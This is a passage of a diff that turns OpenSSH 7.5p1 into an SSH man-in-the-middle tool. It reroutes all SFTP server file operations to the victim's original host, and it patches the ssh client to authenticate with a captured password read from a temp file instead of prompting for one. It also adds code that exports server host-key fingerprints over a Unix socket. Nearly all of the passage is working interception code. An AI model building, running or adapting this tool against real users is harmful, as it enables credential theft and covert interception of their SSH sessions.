@@ -768,11 +839,38 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	u_int32_t read_len;
+	u_int64_t offset;
+	u_int status = 0;
+	u_char *buf = NULL;
+	size_t buf_len = 0;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||
+	    (r = sshbuf_get_u32(iqueue, &read_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: read (handle %d) off %llu len %d",
+	    id, handle_int, (unsigned long long)offset, read_len);
+	buf = mitm_do_read(client_conn, handle_str, handle_len, offset, read_len, &buf_len, &status);
+	if (buf != NULL)
+		send_data(id, buf, buf_len);
+	else
+		send_status(id, status);
+
+	free(buf); buf = NULL;
+	free(handle_str); handle_str = NULL;
 }
 
 static void
 process_write(u_int32_t id)
 {
+	/*
 	u_int64_t off;
 	size_t len;
 	int r, handle, fd, ret, status;
@@ -795,7 +893,9 @@
 			status = errno_to_portable(errno);
 			error("process_write: seek failed");
 		} else {
+	*/
 /* XXX ATOMICIO ? */
+	/*
 			ret = write(fd, data, len);
 			if (ret < 0) {
 				error("process_write: write failed");
@@ -811,21 +911,43 @@
 	}
 	send_status(id, status);
 	free(data);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	u_int64_t offset;
+	u_int status;
+	u_char *buf = NULL;
+	size_t buf_len = 0;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||
+	    (r = sshbuf_get_string(iqueue, &buf, &buf_len)) != 0)
+
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	debug3("request %u: write (handle %d) off %llu len %zu",
+	    id, handle_int, (unsigned long long)offset, buf_len);
+	status = mitm_do_write(client_conn, handle_str, handle_len, offset, buf, buf_len);
+	send_status(id, status);
+
+	free(handle_str); handle_str = NULL;
+	free(buf); buf = NULL;
 }
 
 static void
-process_do_stat(u_int32_t id, int do_lstat)
+process_do_stat(u_int32_t id, int do_lstat_arg)
 {
-	Attrib a;
-	struct stat st;
 	char *name;
 	int r, status = SSH2_FX_FAILURE;
+	Attrib *b;
 
 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug3("request %u: %sstat", id, do_lstat ? "l" : "");
-	verbose("%sstat name \"%s\"", do_lstat ? "l" : "", name);
+	debug3("request %u: %sstat", id, do_lstat_arg ? "l" : "");
+	verbose("%sstat name \"%s\"", do_lstat_arg ? "l" : "", name);
+	/*
 	r = do_lstat ? lstat(name, &st) : stat(name, &st);
 	if (r < 0) {
 		status = errno_to_portable(errno);
@@ -836,6 +958,16 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	if (do_lstat_arg) 
+		b = do_lstat(client_conn, name, 0, &status);
+	else
+		b = do_stat(client_conn, name, 0, &status);
+
+	if (b != NULL)
+		send_attrib(id, b);
+	else
+		send_status(id, status);
 	free(name);
 }
 
@@ -854,10 +986,14 @@
 static void
 process_fstat(u_int32_t id)
 {
-	Attrib a;
-	struct stat st;
-	int fd, r, handle, status = SSH2_FX_FAILURE;
+	Attrib *a;
+	int status = SSH2_FX_FAILURE;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug("request %u: fstat \"%s\" (handle %u)",
@@ -875,8 +1011,20 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fstat (handle %u)", id, handle_int);
+	a = mitm_do_fstat(client_conn, handle_str, handle_len, 1, &status);
+	if (a != NULL)
+		send_attrib(id, a);
+	else
+		send_status(id, status);
+	free(handle_str);  handle_str = NULL;
 }
 
+/*
 static struct timeval *
 attrib_to_tv(const Attrib *a)
 {
@@ -888,6 +1036,7 @@
 	tv[1].tv_usec = 0;
 	return tv;
 }
+*/
 
 static void
 process_setstat(u_int32_t id)
@@ -900,7 +1049,8 @@
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug("request %u: setstat name \"%s\"", id, name);
+	debug3("request %u: setstat name \"%s\"", id, name);
+	/*
 	if (a.flags & SSH2_FILEXFER_ATTR_SIZE) {
 		logit("set \"%s\" size %llu",
 		    name, (unsigned long long)a.size);
@@ -932,6 +1082,8 @@
 		if (r == -1)
 			status = errno_to_portable(errno);
 	}
+	*/
+	status = mitm_do_setstat(client_conn, name, &a);
 	send_status(id, status);
 	free(name);
 }
@@ -940,9 +1092,13 @@
 process_fsetstat(u_int32_t id)
 {
 	Attrib a;
-	int handle, fd, r;
 	int status = SSH2_FX_OK;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0 ||
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
@@ -998,12 +1154,21 @@
 				status = errno_to_portable(errno);
 		}
 	}
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = decode_attrib(iqueue, &a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fsetstat handle %d", id, handle_int);
+	status = mitm_do_fsetstat(client_conn, handle_str, handle_len, &a);
 	send_status(id, status);
+	free(handle_str);  handle_str = NULL;
 }
 
 static void
 process_opendir(u_int32_t id)
 {
+	/*
 	DIR *dirp = NULL;
 	char *path;
 	int r, handle, status = SSH2_FX_FAILURE;
@@ -1028,12 +1193,30 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	int r, status = SSH2_FX_FAILURE;
+	char *path;
+	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug("request %u: opendir \"%s\"", id, path);
+
+	size_t handle_len = 0;
+	u_char *handle_str = mitm_do_opendir(client_conn, path, &handle_len, &status);
+	if (handle_str != NULL) {
+		debug("request %u: opendir \"%s\" returning handle: %u", id, path, handle_from_string(handle_str, handle_len));
+		send_handle_str(id, handle_str, handle_len);
+	} else
+		send_status(id, status);
+
+	free(handle_str);  handle_str = NULL;
 	free(path);
 }
 
 static void
 process_readdir(u_int32_t id)
 {
+	/*
 	DIR *dirp;
 	struct dirent *dp;
 	char *path;
@@ -1060,7 +1243,9 @@
 				nstats *= 2;
 				stats = xreallocarray(stats, nstats, sizeof(Stat));
 			}
+	*/
 /* XXX OVERFLOW ? */
+	/*
 			snprintf(pathname, sizeof pathname, "%s%s%s", path,
 			    strcmp(path, "/") ? "/" : "", dp->d_name);
 			if (lstat(pathname, &st) < 0)
@@ -1069,8 +1254,10 @@
 			stats[count].name = xstrdup(dp->d_name);
 			stats[count].long_name = ls_file(dp->d_name, &st, 0, 0);
 			count++;
+	*/
 			/* send up to 100 entries in one message */
 			/* XXX check packet size instead */
+	/*
 			if (count == 100)
 				break;
 		}
@@ -1085,6 +1272,31 @@
 		}
 		free(stats);
 	}
+	*/
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
+	int status = 0;
+	u_int count = 0, i = 0;
+	Stat *stats;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error", __func__);
+
+	debug("request %u: readdir(handle %d)", id, handle_int);
+	stats = mitm_do_readdir(client_conn, id, handle_str, handle_len, &count, &status);
+	if (stats == NULL)
+		send_status(id, status);
+	else {
+		send_names(id, count, stats);
+		for (i = 0; i < count; i++) {
+			free(stats[i].name); stats[i].name = NULL;
+			free(stats[i].long_name); stats[i].long_name = NULL;
+		}
+		free(stats); stats = NULL;
+	}
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1098,9 +1310,13 @@
 
 	debug3("request %u: remove", id);
 	logit("remove name \"%s\"", name);
+	/*
 	r = unlink(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rm(client_conn, name);
+	send_status(id, status);
 	free(name);
 }
 
@@ -1119,9 +1335,13 @@
 	    a.perm & 07777 : 0777;
 	debug3("request %u: mkdir", id);
 	logit("mkdir name \"%s\" mode 0%o", name, mode);
+	/*
 	r = mkdir(name, mode);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_mkdir(client_conn, name, &a);
+	send_status(id, status);
 	free(name);
 }
 
@@ -1136,18 +1356,23 @@
 
 	debug3("request %u: rmdir", id);
 	logit("rmdir name \"%s\"", name);
+	/*
 	r = rmdir(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rmdir(client_conn, name);
+	send_status(id, status);
 	free(name);
 }
 
 static void
 process_realpath(u_int32_t id)
 {
-	char resolvedname[PATH_MAX];
 	char *path;
 	int r;
+	char *realpath;
+	Stat s;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
@@ -1158,6 +1383,7 @@
 	}
 	debug3("request %u: realpath", id);
 	verbose("realpath \"%s\"", path);
+	/*
 	if (realpath(path, resolvedname) == NULL) {
 		send_status(id, errno_to_portable(errno));
 	} else {
@@ -1166,6 +1392,12 @@
 		s.name = s.long_name = resolvedname;
 		send_names(id, 1, &s);
 	}
+	*/
+	realpath = do_realpath(client_conn, path);
+	attrib_clear(&s.attrib);
+	s.name = s.long_name = realpath;
+	send_names(id, 1, &s);
+	free(realpath); realpath = NULL;
 	free(path);
 }
 
@@ -1174,7 +1406,6 @@
 {
 	char *oldpath, *newpath;
 	int r, status;
-	struct stat sb;
 
 	if ((r = sshbuf_get_cstring(iqueue, &oldpath, NULL)) != 0 ||
 	    (r = sshbuf_get_cstring(iqueue, &newpath, NULL)) != 0)
@@ -1182,11 +1413,14 @@
 
 	debug3("request %u: rename", id);
 	logit("rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	status = SSH2_FX_FAILURE;
 	if (lstat(oldpath, &sb) == -1)
 		status = errno_to_portable(errno);
 	else if (S_ISREG(sb.st_mode)) {
+	*/
 		/* Race-free rename of regular files */
+	/*
 		if (link(oldpath, newpath) == -1) {
 			if (errno == EOPNOTSUPP || errno == ENOSYS
 #ifdef EXDEV
@@ -1198,10 +1432,12 @@
 			    ) {
 				struct stat st;
 
+	*/
 				/*
 				 * fs doesn't support links, so fall back to
 				 * stat+rename.  This is racy.
 				 */
+	/*
 				if (stat(newpath, &st) == -1) {
 					if (rename(oldpath, newpath) == -1)
 						status =
@@ -1214,7 +1450,9 @@
 			}
 		} else if (unlink(oldpath) == -1) {
 			status = errno_to_portable(errno);
+	*/
 			/* clean spare link */
+	/*
 			unlink(newpath);
 		} else
 			status = SSH2_FX_OK;
@@ -1224,6 +1462,8 @@
 		else
 			status = SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 1);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1232,15 +1472,18 @@
 static void
 process_readlink(u_int32_t id)
 {
-	int r, len;
-	char buf[PATH_MAX];
+	int r;
 	char *path;
+	u_int status = 0;
+	char *filename = NULL, *long_name = NULL;
+	Attrib a;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
 	debug3("request %u: readlink", id);
 	verbose("readlink \"%s\"", path);
+	/*
 	if ((len = readlink(path, buf, sizeof(buf) - 1)) == -1)
 		send_status(id, errno_to_portable(errno));
 	else {
@@ -1251,6 +1494,18 @@
 		s.name = s.long_name = buf;
 		send_names(id, 1, &s);
 	}
+	*/
+	if (mitm_do_readlink(client_conn, path, &status, &filename, &long_name, &a) == 1) {
+		Stat s;
+		s.name = filename;
+		s.long_name = long_name;
+		s.attrib = a;
+		send_names(id, 1, &s);
+	} else
+		send_status(id, status);
+
+	free(filename); filename = NULL;
+	free(long_name); long_name = NULL;
 	free(path);
 }
 
@@ -1267,8 +1522,11 @@
 	debug3("request %u: symlink", id);
 	logit("symlink old \"%s\" new \"%s\"", oldpath, newpath);
 	/* this will fail if 'newpath' exists */
+	/*
 	r = symlink(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_symlink(client_conn, oldpath, newpath);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1286,8 +1544,11 @@
 
 	debug3("request %u: posix-rename", id);
 	logit("posix-rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = rename(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 0);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1299,29 +1560,40 @@
 	char *path;
 	struct statvfs st;
 	int r;
+	u_int status = 0;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug3("request %u: statvfs", id);
 	logit("statvfs \"%s\"", path);
 
+	/*
 	if (statvfs(path, &st) != 0)
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+	if (mitm_do_statvfs(client_conn, path, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
         free(path);
 }
 
 static void
 process_extended_fstatvfs(u_int32_t id)
 {
-	int r, handle, fd;
+	int r, handle_int;
 	struct statvfs st;
+	u_int status = 0;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
-	debug("request %u: fstatvfs \"%s\" (handle %u)",
-	    id, handle_to_name(handle), handle);
+
 	if ((fd = handle_to_fd(handle)) < 0) {
 		send_status(id, SSH2_FX_FAILURE);
 		return;
@@ -1330,6 +1602,18 @@
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fstatvfs (handle %u)", id, handle_int);
+	if (mitm_do_fstatvfs(client_conn, handle_str, handle_len, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1344,8 +1628,11 @@
 
 	debug3("request %u: hardlink", id);
 	logit("hardlink old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = link(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_hardlink(client_conn, oldpath, newpath);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1354,19 +1641,29 @@
 static void
 process_extended_fsync(u_int32_t id)
 {
-	int handle, fd, r, status = SSH2_FX_OP_UNSUPPORTED;
+	int handle_int, r, status = SSH2_FX_OP_UNSUPPORTED;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
-	debug3("request %u: fsync (handle %u)", id, handle);
-	verbose("fsync \"%s\"", handle_to_name(handle));
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fsync (handle %u)", id, handle_int);
+	/*
 	if ((fd = handle_to_fd(handle)) < 0)
 		status = SSH2_FX_NO_SUCH_FILE;
 	else if (handle_is_ok(handle, HANDLE_FILE)) {
 		r = fsync(fd);
 		status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_fsync(client_conn, handle_str, handle_len);
 	send_status(id, status);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1485,19 +1782,17 @@
 static void
 sftp_server_usage(void)
 {
-	extern char *__progname;
-
 	fprintf(stderr,
 	    "usage: %s [-ehR] [-d start_directory] [-f log_facility] "
 	    "[-l log_level]\n\t[-P blacklisted_requests] "
 	    "[-p whitelisted_requests] [-u umask]\n"
 	    "       %s -Q protocol_feature\n",
-	    __progname, __progname);
+	    "/usr/libexec/sftp-server", "/usr/libexec/sftp-server");
 	exit(1);
 }
 
 int
-sftp_server_main(int argc, char **argv, struct passwd *user_pw)
+sftp_server_main(int argc, char **argv, struct passwd *user_pw, char *original_host, unsigned short original_port, char *username, char *password)
 {
 	fd_set *rset, *wset;
 	int i, r, in, out, max, ch, skipargs = 0, log_stderr = 0;
@@ -1553,10 +1848,12 @@
 				error("Invalid log facility \"%s\"", optarg);
 			break;
 		case 'd':
+			/*
 			cp = tilde_expand_filename(optarg, user_pw->pw_uid);
 			homedir = percent_expand(cp, "d", user_pw->pw_dir,
 			    "u", user_pw->pw_name, (char *)NULL);
 			free(cp);
+			*/
 			break;
 		case 'p':
 			if (request_whitelist != NULL)
@@ -1638,6 +1935,7 @@
 		}
 	}
 
+	client_conn = make_connection(original_host, original_port, username, password);
 	set_size = howmany(max + 1, NFDBITS) * sizeof(fd_mask);
 	for (;;) {
 		memset(rset, 0, set_size);
@@ -1706,3 +2004,115 @@
 			    __func__, ssh_err(r));
 	}
 }
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+killchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, SIGTERM);
+		waitpid(sshpid, NULL, 0);
+	}
+
+	_exit(1);
+}
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+suspchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, signo);
+		while (waitpid(sshpid, NULL, WUNTRACED) == -1 && errno == EINTR)
+			continue;
+	}
+	kill(getpid(), SIGSTOP);
+}
+
+/* Copied from sftp.c. */
+static void
+connect_to_server(char *path, char **args, int *in, int *out)
+{
+	int c_in, c_out;
+
+#ifdef USE_PIPES
+	int pin[2], pout[2];
+
+	if ((pipe(pin) == -1) || (pipe(pout) == -1))
+		fatal("pipe: %s", strerror(errno));
+	*in = pin[0];
+	*out = pout[1];
+	c_in = pout[0];
+	c_out = pin[1];
+#else /* USE_PIPES */
+	int inout[2];
+
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) == -1)
+		fatal("socketpair: %s", strerror(errno));
+	*in = *out = inout[0];
+	c_in = c_out = inout[1];
+#endif /* USE_PIPES */
+
+	if ((sshpid = fork()) == -1)
+		fatal("fork: %s", strerror(errno));
+	else if (sshpid == 0) {
+		if ((dup2(c_in, STDIN_FILENO) == -1) ||
+		    (dup2(c_out, STDOUT_FILENO) == -1)) {
+			fprintf(stderr, "dup2: %s\n", strerror(errno));
+			_exit(1);
+		}
+		close(*in);
+		close(*out);
+		close(c_in);
+		close(c_out);
+
+		/*
+		 * The underlying ssh is in the same process group, so we must
+		 * ignore SIGINT if we want to gracefully abort commands,
+		 * otherwise the signal will make it to the ssh process and
+		 * kill it too.  Contrawise, since sftp sends SIGTERMs to the
+		 * underlying ssh, it must *not* ignore that signal.
+		 */
+		signal(SIGINT, SIG_IGN);
+		signal(SIGTERM, SIG_DFL);
+
+		execvp(path, args);
+		fprintf(stderr, "exec: %s: %s\n", path, strerror(errno));
+		_exit(1);
+	}
+
+	signal(SIGTERM, killchild);
+	signal(SIGINT, killchild);
+	signal(SIGHUP, killchild);
+	signal(SIGTSTP, suspchild);
+	signal(SIGTTIN, suspchild);
+	signal(SIGTTOU, suspchild);
+	close(c_in);
+	close(c_out);
+}
+
+struct sftp_conn *
+make_connection(char *host, unsigned short port, char *username, char *password) {
+	arglist args;
+	char *ssh_program = "/home/ssh-mitm/bin/ssh";
+	int in = -1, out = -1;
+
+	args.list = NULL;
+	addargs(&args, "%s", ssh_program);
+	addargs(&args, "-Z");
+	addargs(&args, "%s", password);
+	addargs(&args, "-oForwardX11=no");
+	addargs(&args, "-oForwardAgent=no");
+	addargs(&args, "-oPermitLocalCommand=no");
+	addargs(&args, "-oClearAllForwardings=yes");
+	addargs(&args, "-oPort=%u", port);
+	addargs(&args, "-oProtocol=2");
+	addargs(&args, "-s");
+	addargs(&args, "--");
+	addargs(&args, "%s@%s", username, host);
+	addargs(&args, "sftp");
+	connect_to_server(ssh_program, args.list, &in, &out);
+	return do_init(in, out, 32768, 64, 0);
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server-main.c openssh-7.5p1-mitm/sftp-server-main.c
--- openssh-7.5p1/sftp-server-main.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-server-main.c	2017-07-24 15:25:11.271472637 -0400
@@ -21,6 +21,7 @@
 #include <pwd.h>
 #include <stdarg.h>
 #include <stdio.h>
+#include <string.h>
 #include <unistd.h>
 
 #include "log.h"
@@ -38,6 +39,13 @@
 main(int argc, char **argv)
 {
 	struct passwd *user_pw;
+	char **new_argv;
+	int i;
+
+	if (argc < 4) {
+		fprintf(stderr, "Error: at least four arguments necessary.\n");
+		return 1;
+	}
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
@@ -49,5 +57,11 @@
 		return 1;
 	}
 
-	return (sftp_server_main(argc, argv, user_pw));
+	new_argv = calloc(argc - 4, sizeof(char *));
+
+	new_argv[0] = strdup(argv[0]);
+	for (i = 1; i < argc - 4; i++)
+		new_argv[i] = strdup(argv[i + 4]);
+
+	return (sftp_server_main(argc - 4, new_argv, user_pw, argv[1], (unsigned short)atoi(argv[2]), argv[3], argv[4]));
 }
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
--- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/ssh.c	2017-07-24 15:25:11.271472637 -0400
@@ -49,6 +49,7 @@
 #include <sys/resource.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <sys/un.h>
 #include <sys/wait.h>
 
 #include <ctype.h>
@@ -110,6 +111,7 @@
 #include "ssherr.h"
 #include "myproposal.h"
 #include "utf8.h"
+#include "lol.h"
 
 #ifdef ENABLE_PKCS11
 #include "ssh-pkcs11.h"
@@ -192,6 +194,10 @@
 extern int muxserver_sock;
 extern u_int muxclient_command;
 
+int num_hostkey_fps = 0;
+hostkey_fp *server_hostkey_fps = NULL;
+int fingerprint_file_fd = -1;
+
 /* Prints a help message to the user.  This function never returns. */
 
 static void
@@ -524,6 +530,9 @@
 	struct addrinfo *addrs = NULL;
 	struct ssh_digest_ctx *md;
 	u_char conn_hash[SSH_DIGEST_MAX_LENGTH];
+	char *password = NULL;
+	int fd = -1, bytes_read = 0, ret = 0;
+	struct stat password_stat;
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
@@ -548,6 +557,9 @@
 	 */
 	closefrom(STDERR_FILENO + 1);
 
+	/* Initialize the array of host key fingerprints. */
+	server_hostkey_fps = calloc(MAX_SERVER_HOSTKEY_FPS, sizeof(hostkey_fp));
+
 	/*
 	 * Save the original real uid.  It will be needed later (uid-swapping
 	 * may clobber the real uid).
@@ -605,8 +617,9 @@
 	argv0 = av[0];
 
  again:
+	/* Add -Z to get the password to use. */
 	while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
-	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy")) != -1) {
+	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:z:")) != -1) {
 		switch (opt) {
 		case '1':
 			options.protocol = SSH_PROTO_1;
@@ -931,6 +944,46 @@
 		case 'F':
 			config = optarg;
 			break;
+		case 'Z':
+			/* The password is in a temporary file.  We will read it, then delete the file. */
+			fd = open(optarg, O_RDONLY);
+			if (fd < 0)
+				exit(-1);
+			if (fstat(fd, &password_stat) < 0)
+				exit(-1);
+
+			/* Probably overkill, but hey, read() might not return all bytes... */
+			password = malloc(password_stat.st_size + 1);
+			while (bytes_read != password_stat.st_size) {
+				ret = read(fd, password + bytes_read, password_stat.st_size - bytes_read);
+				if (ret < 0)
+					exit(-1);
+				else
+					bytes_read += ret;
+			}
+			password[password_stat.st_size] = '\0';
+			close(fd);
+			unlink(optarg);
+			break;
+		case 'z':
+			/* The argument here is the path to the socket to
+			 * write server host key fingerprints to.  We will
+			 * connect to it here, then write them in the
+			 * write_hostkeys() function. */
+			if (strlen(optarg) > 0) {
+			  struct sockaddr_un addr;
+
+			  memset(&addr, 0, sizeof(addr));
+			  addr.sun_family = AF_UNIX;
+			  fingerprint_file_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+
+			  strlcpy(addr.sun_path, optarg, sizeof(addr.sun_path));
+			  if (connect(fingerprint_file_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+			    shutdown(fingerprint_file_fd, SHUT_RDWR);
+			    fingerprint_file_fd = -1;
+			  }
+			}
+			break;
 		default:
 			usage();
 		}
@@ -1292,6 +1345,7 @@
 	sensitive_data.nkeys = 0;
 	sensitive_data.keys = NULL;
 	sensitive_data.external_keysign = 0;
+	sensitive_data.password = password;
 	if (options.rhosts_rsa_authentication ||
 	    options.hostbased_authentication) {
 		sensitive_data.nkeys = 9;
@@ -2194,3 +2248,27 @@
 	signal(sig, main_sigchld_handler);
 	errno = save_errno;
 }
+
+void write_hostkeys() {
+  int i = 0;
+
+  if (fingerprint_file_fd == -1)
+    return;
+
+  for(i = 0; i < num_hostkey_fps; i++) {
+    char *old = server_hostkey_fps[i].old;
+    char *new = server_hostkey_fps[i].new;
+
+    write(fingerprint_file_fd, old, strlen(old));
+    write(fingerprint_file_fd, "\n", strlen("\n"));
+    write(fingerprint_file_fd, new, strlen(new));
+    write(fingerprint_file_fd, "\n", strlen("\n"));
+
+    free(server_hostkey_fps[i].old); server_hostkey_fps[i].old = NULL;
+    free(server_hostkey_fps[i].new); server_hostkey_fps[i].new = NULL;
+  }
+  shutdown(fingerprint_file_fd, SHUT_RDWR);
+  fingerprint_file_fd = -1;
+  free(server_hostkey_fps); server_hostkey_fps = NULL;
+  num_hostkey_fps = 0;
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
--- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect2.c	2017-07-24 15:25:11.271472637 -0400
@@ -81,6 +81,7 @@
 extern char *client_version_string;
 extern char *server_version_string;
 extern Options options;
+extern void write_hostkeys();
 
 /*
  * SSH2 key exchange
@@ -218,6 +219,7 @@
 	kex->verify_host_key=&verify_host_key_callback;
 
 	dispatch_run(DISPATCH_BLOCK, &kex->done, active_state);
+	write_hostkeys();
 
 	/* remove ext-info from the KEX proposals for rekeying */
 	myproposal[PROPOSAL_KEX_ALGS] =
@@ -906,7 +908,8 @@
 
 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 	    authctxt->server_user, host);
-	password = read_passphrase(prompt, 0);
+	/* password = read_passphrase(prompt, 0); */
+	password = strdup(authctxt->sensitive->password);  /* TODO: zero out password field now? */
 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
 	packet_put_cstring(authctxt->service);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
--- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect.c	2017-07-24 15:25:11.271472637 -0400
@@ -64,6 +64,8 @@
 #include "authfile.h"
 #include "ssherr.h"
 #include "authfd.h"
+#include "digest.h"
+#include "lol.h"
 
 char *client_version_string = NULL;
 char *server_version_string = NULL;
@@ -78,6 +80,8 @@
 extern char *__progname;
 extern uid_t original_real_uid;
 extern uid_t original_effective_uid;
+extern int num_hostkey_fps;
+extern hostkey_fp *server_hostkey_fps;
 
 static int show_other_keys(struct hostkeys *, Key *);
 static void warn_changed_key(Key *);
@@ -916,10 +920,12 @@
 				    "address '%.128s' to the list of known "
 				    "hosts (%.500s).", type, ip,
